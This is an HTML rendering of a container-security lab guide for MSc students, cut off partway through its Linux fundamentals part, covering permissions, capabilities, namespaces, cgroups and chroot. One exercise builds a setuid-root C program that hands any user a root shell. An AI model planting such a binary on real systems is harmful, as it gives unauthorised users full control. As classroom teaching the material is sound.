@@ -1,0 +1,2110 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Lab.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> or <div class="page"></div> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
+          ? 'dark'
+          : 'default'
+    });
+  </script>
+<h1 id="securing-containers-laboratory-part">Securing Containers: Laboratory Part</h1>
+<p><strong>Author:</strong> Anargyros Tsadimas</p>
+<p><strong>Role:</strong> Assistant Professor, DevOps &amp; Software Engineer</p>
+<p><strong>Scope:</strong> 5-Day study mission program
+for Efrei MSc students
+20/4/2026-24/4/2026</p>
+<p><strong>Latest version:</strong> https://github.com/tsadimasteaching/efrei/blob/main/Lab.md</p>
+<hr>
+<h2 id="contents">Contents</h2>
+<ul>
+<li><a href="#prerequisites">Prerequisites</a></li>
+<li><a href="#part-1-linux-fundamentals">Part 1: Linux Fundamentals</a>
+<ul>
+<li><a href="#explore-setuid">Explore setuid</a></li>
+<li><a href="#explore-linux-capabilities">Explore Linux Capabilities</a></li>
+<li><a href="#introduction-to-containers-and-namespaces">Introduction to Containers and Namespaces</a></li>
+<li><a href="#exploring-and-using-linux-control-groups-cgroups-v2">Exploring and Using Linux Control Groups (cgroups v2)</a></li>
+<li><a href="#exercise-create-an-isolated-environment-without-docker">Exercise: Create an isolated environment without Docker</a></li>
+</ul>
+</li>
+<li><a href="#part-2-containers-threat-modeling-and-attack-surface">Part 2: Containers Threat Modeling and Attack Surface</a>
+<ul>
+<li><a href="#run-a-vulnerable-container">Run a vulnerable container</a></li>
+<li><a href="#simulate-privilege-escalation-with-host-mounts">Simulate privilege escalation with host mounts</a></li>
+<li><a href="#docker-socket-attack">Docker socket attack</a></li>
+<li><a href="#lab-attackers-mindset-with-amicontained">Lab: Attacker's Mindset with amicontained</a></li>
+</ul>
+</li>
+<li><a href="#part-3-runtime-hardening">Part 3: Runtime Hardening</a>
+<ul>
+<li><a href="#capabilities">Capabilities</a></li>
+<li><a href="#seccomp">Seccomp</a></li>
+<li><a href="#apparmor">AppArmor</a></li>
+<li><a href="#hardening-docker-compose">Hardening Docker Compose</a></li>
+</ul>
+</li>
+<li><a href="#part-4-secure-image-build-and-scanning">Part 4: Secure Image Build and Scanning</a>
+<ul>
+<li><a href="#understanding-overlayfs-dockers-storage-driver">Understanding OverlayFS (Docker's Storage Driver)</a></li>
+<li><a href="#compare-ubuntu-vs-alpine-base-images">Compare Ubuntu vs Alpine base images</a></li>
+<li><a href="#build-and-scan-a-deliberately-vulnerable-image">Build and scan a deliberately vulnerable image</a></li>
+<li><a href="#apply-security-rules-to-a-real-application">Apply security rules to a real application</a></li>
+<li><a href="#inspect-image-layers-with-dive">Inspect image layers with Dive</a></li>
+<li><a href="#exercise-prove-that-deleting-isnt-removing-in-overlayfs">Exercise: Prove that &quot;deleting isn't removing&quot; in OverlayFS</a></li>
+</ul>
+</li>
+<li><a href="#part-5-security-tools">Part 5: Security Tools</a>
+<ul>
+<li><a href="#ebpf-extended-berkeley-packet-filter">eBPF (Extended Berkeley Packet Filter)</a></li>
+<li><a href="#tetragon">Tetragon</a></li>
+<li><a href="#explore-tetragon">Explore Tetragon</a></li>
+<li><a href="#create-custom-tracing-policies">Create custom tracing policies</a></li>
+<li><a href="#detect-shell-spawned-in-containers">Detect shell spawned in containers</a></li>
+<li><a href="#full-circle-detect-the-part-2-attacks-with-tetragon">Full-circle: Detect the Part 2 attacks with Tetragon</a></li>
+<li><a href="#exercise-monitor-a-real-application-with-tetragon">Exercise: Monitor a real application with Tetragon</a></li>
+<li><a href="#docker-bench-for-security">Docker Bench for Security</a></li>
+</ul>
+</li>
+<li><a href="#part-6-sandboxing">Part 6: Sandboxing</a>
+<ul>
+<li><a href="#rootless-docker">Rootless Docker</a></li>
+<li><a href="#understanding-rootless-mode-vs-userns-remap">Understanding: Rootless mode vs userns-remap</a></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="prerequisites">Prerequisites</h2>
+<p>To follow the exercises in this guide, ensure you have the following setup:</p>
+<ul>
+<li>
+<p><strong>Docker Engine:</strong> <a href="https://docs.docker.com/engine/install/">Installation Guide</a></p>
+</li>
+<li>
+<p><strong>Security Tools:</strong></p>
+<ul>
+<li><code>strace</code>: <a href="https://ioflood.com/blog/install-strace-command-linux/">Install Guide</a></li>
+<li><code>grype</code>: <a href="https://github.com/anchore/grype">GitHub</a></li>
+</ul>
+<pre class="hljs"><code><div>curl -sSfL https://get.anchore.io/grype | <span class="hljs-built_in">sudo</span> sh -s -- -b /usr/local/bin
+</div></code></pre>
+<ul>
+<li><code>trivy</code>: <a href="https://github.com/aquasecurity/trivy">GitHub</a></li>
+<li><code>dive</code>: <a href="https://github.com/wagoodman/dive">GitHub</a></li>
+</ul>
+<pre class="hljs"><code><div>DIVE_VERSION=$(curl -sL <span class="hljs-string">&quot;https://api.github.com/repos/wagoodman/dive/releases/latest&quot;</span> | grep <span class="hljs-string">&#x27;&quot;tag_name&quot;:&#x27;</span> | sed -E <span class="hljs-string">&#x27;s/.*&quot;v([^&quot;]+)&quot;.*/\1/&#x27;</span>)
+curl -fOL <span class="hljs-string">&quot;https://github.com/wagoodman/dive/releases/download/v<span class="hljs-variable">${DIVE_VERSION}</span>/dive_<span class="hljs-variable">${DIVE_VERSION}</span>_linux_amd64.deb&quot;</span>
+<span class="hljs-built_in">sudo</span> apt install ./dive_<span class="hljs-variable">${DIVE_VERSION}</span>_linux_amd64.deb
+</div></code></pre>
+<ul>
+<li><code>amicontained</code>: <a href="https://github.com/genuinetools/amicontained">GitHub</a></li>
+</ul>
+</li>
+<li>
+<p><strong>Environment:</strong> VirtualBox with Ubuntu Server (LTS 24.04.2), 4GB RAM, 2 CPUs.</p>
+</li>
+</ul>
+<hr>
+<h2 id="part-1-linux-fundamentals">Part 1: Linux Fundamentals</h2>
+<h3 id="unix-permissions-setuid-and-setgid">Unix Permissions, setuid, and setgid</h3>
+<p>Linux file permissions follow a three-group model: <strong>owner</strong>, <strong>group</strong>, and <strong>others</strong>. Each group can have <strong>read</strong> (<code>r</code>), <strong>write</strong> (<code>w</code>), and <strong>execute</strong> (<code>x</code>) permissions:</p>
+<pre class="hljs"><code><div>- r w x r w x r w x
+|  |       |       |
+|  |       |       +-- Read, write, and execute for all other users
+|  |       +---------- Read, write, and execute for group owner
+|  +------------------ Read, write, and execute for file owner
++--------------------- File type (- = regular, d = directory)
+</div></code></pre>
+<p>Numeric (octal) notation: each permission has a value — <code>r=4</code>, <code>w=2</code>, <code>x=1</code>. For example, <code>754</code> means:</p>
+<ul>
+<li><strong>7</strong> (owner): rwx = 4+2+1</li>
+<li><strong>5</strong> (group): r-x = 4+0+1</li>
+<li><strong>4</strong> (others): r-- = 4+0+0</li>
+</ul>
+<p>Beyond the standard rwx bits, Linux has three <strong>special permission bits</strong>:</p>
+<p><strong>setuid (Set User ID)</strong> — When set on an executable, the process runs with the <strong>file owner's</strong> privileges, not the caller's. The classic example is <code>/usr/bin/passwd</code>:</p>
+<pre class="hljs"><code><div>$ <span class="hljs-built_in">ls</span> -l /usr/bin/passwd
+-rwsr-xr-x 1 root root 68208 /usr/bin/passwd
+</div></code></pre>
+<p>The <code>s</code> in the owner's execute position (<code>rws</code>) means setuid is active. Any user who runs <code>passwd</code> temporarily becomes root — which is necessary because only root can write to <code>/etc/shadow</code>. You set it with <code>chmod 4755</code> (the leading <code>4</code> enables setuid).</p>
+<p><strong>setgid (Set Group ID)</strong> — When set on an executable, the process runs with the <strong>file group's</strong> privileges. When set on a <strong>directory</strong>, new files created inside inherit the directory's group (instead of the creator's default group). This is useful for shared project directories.</p>
+<pre class="hljs"><code><div>$ <span class="hljs-built_in">ls</span> -l /usr/bin/wall
+-rwxr-sr-x 1 root <span class="hljs-built_in">tty</span> 19024 /usr/bin/wall
+</div></code></pre>
+<p>The <code>s</code> in the group's execute position means setgid is active. You set it with <code>chmod 2755</code> (the leading <code>2</code> enables setgid).</p>
+<p><strong>Sticky bit</strong> — When set on a directory, only the file owner (or root) can delete or rename files inside, even if others have write permission. The classic example is <code>/tmp</code>:</p>
+<pre class="hljs"><code><div>$ <span class="hljs-built_in">ls</span> -ld /tmp
+drwxrwxrwt 26 root root 1191936 /tmp
+</div></code></pre>
+<p>The <code>t</code> at the end indicates the sticky bit. Without it, any user with write access to <code>/tmp</code> could delete anyone else's files. You set it with <code>chmod 1777</code> (the leading <code>1</code> enables sticky bit).</p>
+<p><strong>Security implications:</strong> setuid is a common privilege escalation vector. If you set setuid on a shell (e.g., bash), any user who runs it gets a root shell. Container image scanners (like Trivy) flag files with the setuid bit. You can prevent setuid escalation in Docker with <code>--no-new-privileges</code>.</p>
+<h3 id="explore-setuid">Explore setuid</h3>
+<p>setuid allows a user to execute a binary with the permissions of the file owner (e.g., root).</p>
+<p><strong>1. Create <code>rootshell.c</code></strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">cat</span> &gt; rootshell.c &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span>
+<span class="hljs-comment">#include &lt;stdio.h&gt;</span>
+<span class="hljs-comment">#include &lt;stdlib.h&gt;</span>
+<span class="hljs-comment">#include &lt;unistd.h&gt;</span>
+
+int <span class="hljs-function"><span class="hljs-title">main</span></span>() {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Current UID: %d\n&quot;</span>, getuid());
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Switching to /bin/sh as root...\n&quot;</span>);
+    setuid(0); // ensure we become root
+    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);
+    <span class="hljs-built_in">return</span> 0;
+}
+EOF
+</div></code></pre>
+<p><strong>2. Compile and set permissions</strong></p>
+<pre class="hljs"><code><div>gcc -o rootshell rootshell.c
+<span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chown</span> root:root rootshell
+<span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chmod</span> 4755 rootshell
+<span class="hljs-built_in">ls</span> -l rootshell
+</div></code></pre>
+<p><strong>3. Execution</strong></p>
+<p>Running <code>./rootshell</code> as a normal user will result in a root prompt (<code>#</code>).</p>
+<h3 id="explore-linux-capabilities">Explore Linux Capabilities</h3>
+<p>Capabilities divide root privileges into smaller units.</p>
+<p><strong>1. Create <code>filefixer.c</code></strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">cat</span> &gt; filefixer.c &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span>
+<span class="hljs-comment">#include &lt;stdio.h&gt;</span>
+<span class="hljs-comment">#include &lt;stdlib.h&gt;</span>
+<span class="hljs-comment">#include &lt;unistd.h&gt;</span>
+<span class="hljs-comment">#include &lt;sys/types.h&gt;</span>
+
+int main(int argc, char *argv[]) {
+    <span class="hljs-keyword">if</span> (argc != 2) {
+        fprintf(stderr, <span class="hljs-string">&quot;Usage: %s &lt;filename&gt;\n&quot;</span>, argv[0]);
+        <span class="hljs-built_in">return</span> 1;
+    }
+    const char *filename = argv[1];
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">chown</span>(filename, 969, 969) != 0) {
+        perror(<span class="hljs-string">&quot;chown failed&quot;</span>);
+        <span class="hljs-built_in">return</span> 1;
+    }
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Ownership changed to UID 969 and GID 969.\n&quot;</span>);
+    <span class="hljs-built_in">return</span> 0;
+}
+EOF
+</div></code></pre>
+<p><strong>2. Test and Grant Capability</strong></p>
+<pre class="hljs"><code><div>gcc -o filefixer filefixer.c
+<span class="hljs-built_in">touch</span> file1
+./filefixer file1 <span class="hljs-comment"># Fails</span>
+<span class="hljs-built_in">sudo</span> <span class="hljs-built_in">setcap</span> <span class="hljs-string">&#x27;cap_chown=+ep&#x27;</span> ./filefixer
+./filefixer file1 <span class="hljs-comment"># Succeeds</span>
+<span class="hljs-built_in">getcap</span> ./filefixer
+
+</div></code></pre>
+<h3 id="introduction-to-containers-and-namespaces">Introduction to Containers and Namespaces</h3>
+<p>Start a container</p>
+<pre class="hljs"><code><div>docker run -it --<span class="hljs-built_in">rm</span> alpine sh
+</div></code></pre>
+<p>Inspect namespaces inside container:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">ls</span> -l /proc/1/ns/
+</div></code></pre>
+<p>Find the process id of the sh from the host</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> lsns | grep $(pidof sh)
+</div></code></pre>
+<p>Use unshare to simulate isolated environments</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> unshare --mount --uts --ipc --net --pid --fork sh
+hostname spiderman
+</div></code></pre>
+<p><strong>Breaking down the command:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Part</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo</code></td>
+<td>Run as root — creating namespaces requires <code>CAP_SYS_ADMIN</code></td>
+</tr>
+<tr>
+<td><code>unshare</code></td>
+<td>Linux utility that creates new namespaces and runs a program in them</td>
+</tr>
+<tr>
+<td><code>--mount</code></td>
+<td>New <strong>Mount namespace</strong> — mounts/unmounts inside won't affect the host</td>
+</tr>
+<tr>
+<td><code>--uts</code></td>
+<td>New <strong>UTS namespace</strong> — allows a separate hostname and domain name</td>
+</tr>
+<tr>
+<td><code>--ipc</code></td>
+<td>New <strong>IPC namespace</strong> — isolates shared memory, semaphores, message queues</td>
+</tr>
+<tr>
+<td><code>--net</code></td>
+<td>New <strong>Network namespace</strong> — gets its own network stack (interfaces, routes, iptables)</td>
+</tr>
+<tr>
+<td><code>--pid</code></td>
+<td>New <strong>PID namespace</strong> — processes inside start from PID 1</td>
+</tr>
+<tr>
+<td><code>--fork</code></td>
+<td>Fork before executing the command — required with <code>--pid</code> so the new process becomes PID 1 in the new namespace</td>
+</tr>
+<tr>
+<td><code>sh</code></td>
+<td>The shell to run inside the isolated namespaces</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Note:</strong> Without <code>--fork</code>, the <code>sh</code> process would retain its original PID from the parent namespace and <code>/proc</code> would not work correctly inside the new PID namespace.</p>
+</blockquote>
+<p>You enter a new UTS (hostname) namespace, but unless you explicitly set a new hostname, it defaults to inheriting the current hostname (from the parent/host).</p>
+<p>So the UTS namespace is isolated, but you haven't changed the hostname yet — so it looks the same until you modify it.</p>
+<h3 id="exploring-and-using-linux-control-groups-cgroups-v2">Exploring and Using Linux Control Groups (cgroups v2)</h3>
+<p>Cgroups manage resource limits (CPU, Memory, I/O) for groups of processes. In cgroups v2, all controllers are unified under a single hierarchy at <code>/sys/fs/cgroup/</code>.</p>
+<p><strong>1. Check cgroup version and mount status</strong></p>
+<pre class="hljs"><code><div>mount | grep cgroup
+</div></code></pre>
+<p>You can also confirm the filesystem type:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">stat</span> -<span class="hljs-built_in">fc</span> %T /sys/fs/cgroup/
+</div></code></pre>
+<p>If it returns <code>cgroup2fs</code>, you are running cgroups v2.</p>
+<p><strong>2. Create a new memory-limited cgroup</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> /sys/fs/cgroup/my_cgroup
+</div></code></pre>
+<p>List its contents to see the available controllers:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">ls</span> -l /sys/fs/cgroup/my_cgroup
+</div></code></pre>
+<p>Set a memory limit of 100MB:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">echo</span> $((<span class="hljs-number">100</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">1024</span>)) | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /sys/fs/cgroup/my_cgroup/memory.max
+</div></code></pre>
+<p>Disable swap for this cgroup (otherwise processes swap out instead of being OOM-killed):</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">echo</span> 0 | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /sys/fs/cgroup/my_cgroup/memory.swap.max
+</div></code></pre>
+<p>Confirm the limits were applied:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">cat</span> /sys/fs/cgroup/my_cgroup/memory.max
+</div></code></pre>
+<p><strong>3. Put your current shell into the cgroup</strong></p>
+<p>The simplest way is to write your shell's own PID (<code>$$</code>) into the cgroup. All child processes you launch afterwards will inherit the cgroup membership:</p>
+<pre class="hljs"><code><div><span class="hljs-comment"># Run a new bash inside the cgroup</span>
+<span class="hljs-built_in">sudo</span> bash -c <span class="hljs-string">&#x27;echo $$ &gt; /sys/fs/cgroup/my_cgroup/cgroup.procs &amp;&amp; exec bash&#x27;</span>
+</div></code></pre>
+<p>Verify you are inside the cgroup:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">cat</span> /proc/self/cgroup
+<span class="hljs-comment"># Should show: 0::/my_cgroup</span>
+</div></code></pre>
+<p><strong>4. Test the memory limit</strong></p>
+<p>Create a small C program that allocates memory and touches every page (forcing real physical allocation):</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">cat</span> &gt; /tmp/eat_memory.c &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span>
+<span class="hljs-comment">#include &lt;stdio.h&gt;</span>
+<span class="hljs-comment">#include &lt;stdlib.h&gt;</span>
+<span class="hljs-comment">#include &lt;string.h&gt;</span>
+
+int main(int argc, char *argv[]) {
+    size_t mb = argc &gt; 1 ? atoi(argv[1]) : 150;
+    size_t bytes = mb * 1024 * 1024;
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating %zu MB...\n&quot;</span>, mb);
+    char *p = malloc(bytes);
+    <span class="hljs-keyword">if</span> (!p) { perror(<span class="hljs-string">&quot;malloc&quot;</span>); <span class="hljs-built_in">return</span> 1; }
+    /* Touch every page to force physical allocation */
+    memset(p, <span class="hljs-string">&#x27;A&#x27;</span>, bytes);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocated and touched %zu MB successfully\n&quot;</span>, mb);
+    free(p);
+    <span class="hljs-built_in">return</span> 0;
+}
+EOF
+gcc -o /tmp/eat_memory /tmp/eat_memory.c
+</div></code></pre>
+<p>First, try a small allocation that fits within the limit:</p>
+<pre class="hljs"><code><div>/tmp/eat_memory 50
+<span class="hljs-comment"># Allocated and touched 50 MB successfully</span>
+</div></code></pre>
+<p>This succeeds because 50MB is well under the 100MB limit. Now try allocating more than the limit:</p>
+<pre class="hljs"><code><div>/tmp/eat_memory 150
+<span class="hljs-comment"># Killed</span>
+</div></code></pre>
+<p>The process is killed by the OOM killer because 150MB exceeds the 100MB cgroup limit.</p>
+<p><strong>Verify the OOM kill from the host</strong> (run this in a separate terminal, not inside the cgroup):</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> dmesg | <span class="hljs-built_in">tail</span> -20
+</div></code></pre>
+<p>You should see a message like:</p>
+<pre class="hljs"><code><div>Memory cgroup out of memory: Killed process &lt;PID&gt; (eat_memory)
+</div></code></pre>
+<p>You can also check the cgroup's OOM counter:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">cat</span> /sys/fs/cgroup/my_cgroup/memory.events
+</div></code></pre>
+<p>The <code>oom_kill</code> counter should be greater than 0.</p>
+<p><strong>5. Cleanup</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">rmdir</span> /sys/fs/cgroup/my_cgroup
+</div></code></pre>
+<h3 id="exercise-create-an-isolated-environment-without-docker">Exercise: Create an isolated environment without Docker</h3>
+<p><strong>1. Create the directory structure:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">mkdir</span> ~/sandbox
+<span class="hljs-built_in">cd</span> ~/sandbox
+<span class="hljs-built_in">mkdir</span> rootfs
+<span class="hljs-built_in">cd</span> rootfs
+</div></code></pre>
+<p><strong>2. Fetch BusyBox:</strong></p>
+<p>BusyBox is a tiny, single-binary version of many standard Unix commands. You make it executable so it can act like tools such as <code>sh</code>, <code>ls</code>, <code>cat</code>, etc.</p>
+<pre class="hljs"><code><div>wget https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox
+<span class="hljs-built_in">chmod</span> +x busybox
+</div></code></pre>
+<p><strong>3. Create the Linux filesystem:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">mkdir</span> bin proc dev sys tmp
+<span class="hljs-built_in">mv</span> busybox bin/
+</div></code></pre>
+<p><strong>4. Create symlinks for common commands:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">cd</span> bin
+<span class="hljs-keyword">for</span> cmd <span class="hljs-keyword">in</span> sh <span class="hljs-built_in">ls</span> ps <span class="hljs-built_in">echo</span> <span class="hljs-built_in">cat</span> mount <span class="hljs-built_in">uname</span> hostname top <span class="hljs-built_in">id</span>; <span class="hljs-keyword">do</span> <span class="hljs-built_in">ln</span> -s busybox <span class="hljs-variable">$cmd</span>; <span class="hljs-keyword">done</span>
+<span class="hljs-built_in">cd</span> ..
+</div></code></pre>
+<p>This creates symbolic links like <code>/bin/sh → busybox</code>, so when BusyBox sees it's being called as <code>sh</code>, it acts like a shell. This is how BusyBox mimics multiple commands using one binary.</p>
+<p><strong>5. Enter the isolated environment:</strong></p>
+<p><code>chroot</code> (change root) changes the apparent root directory (<code>/</code>) for a process and its children. After <code>chroot ~/sandbox/rootfs</code>, the process sees <code>~/sandbox/rootfs</code> as <code>/</code> — it cannot access files outside that directory tree. This was the original Unix &quot;container&quot; mechanism before namespaces existed.</p>
+<p>However, <code>chroot</code> alone is <strong>not secure</strong>: a root process can escape using <code>mkdir</code>+<code>chroot</code>+<code>cd</code> tricks, and it doesn't isolate PIDs, network, or other resources. That's why we combine it with <code>unshare</code> to add proper namespace isolation.</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> unshare --mount --uts --ipc --net --pid --fork <span class="hljs-built_in">chroot</span> ~/sandbox/rootfs /bin/sh
+</div></code></pre>
+<p>This combines <code>unshare</code> (namespace isolation) with <code>chroot</code> (filesystem isolation):</p>
+<table>
+<thead>
+<tr>
+<th>Part</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>unshare --mount</code></td>
+<td>Separate mount table</td>
+</tr>
+<tr>
+<td><code>--uts</code></td>
+<td>Isolate hostname/domain</td>
+</tr>
+<tr>
